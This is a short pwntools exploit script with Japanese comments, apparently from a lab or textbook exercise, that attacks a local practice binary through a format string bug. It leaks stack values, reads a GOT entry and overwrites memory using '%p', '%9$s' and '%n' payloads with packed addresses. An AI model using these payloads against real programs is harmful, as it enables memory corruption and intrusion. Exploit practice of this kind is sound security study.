#!/usr/bin/env python3
from pwn import *
import sys
import struct

bin_file = './fsb_aarw'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)

# ユーザの入力の位置確認
def attack_35_19(conn, **kwargs):

    exploit = 'aaaaaaaa %p %p %p %p %p %p %p %p %p'
    conn.sendline(exploit)
    print(conn.recvall().decode())

# 設定した値の確認
def attack_35_20(conn, **kwargs):
    exploit = b'%9$p'.ljust(8,b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall().decode())

# GOTの読み出し（%sをつけて読み出す）
def attack_35_21(conn, **kwargs):
    exploit = b'%9$s'.ljust(8,b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall())	# バイナリ表示

# メモリ改竄
def attack_35_22(conn, **kwargs):
    exploit = b'%9$n'.ljust(8,b'\x00')
    exploit += struct.pack('<Q', 0x404028)
    conn.sendline(exploit)
    #print(conn.recvall().decode())

# メモリ改竄
def attack_35_23(conn, **kwargs):
    exploit = b'%258c%10$n'.ljust(0x10,b'\x00')
    exploit += struct.pack('<Q', 0x404028)
    conn.sendline(exploit)
    #print(conn.recvall().decode())

def main():
    print('### attack_35_19 ###')
    conn = process(bin_file)
    attack_35_19(conn)
    
    print('### attack_35_20 ###')
    conn = process(bin_file)
    attack_35_20(conn)
    
    print('### attack_35_21 ###')
    conn = process(bin_file)
    attack_35_21(conn)
    
    print('### attack_35_22 ###')
    #conn = process(bin_file)
    conn = gdb.debug(bin_file)
    attack_35_22(conn)
    
    print('### attack_35_23 ###')
    #conn = process(bin_file)
    conn = gdb.debug(bin_file)
    attack_35_23(conn)

if __name__=='__main__':
    main()
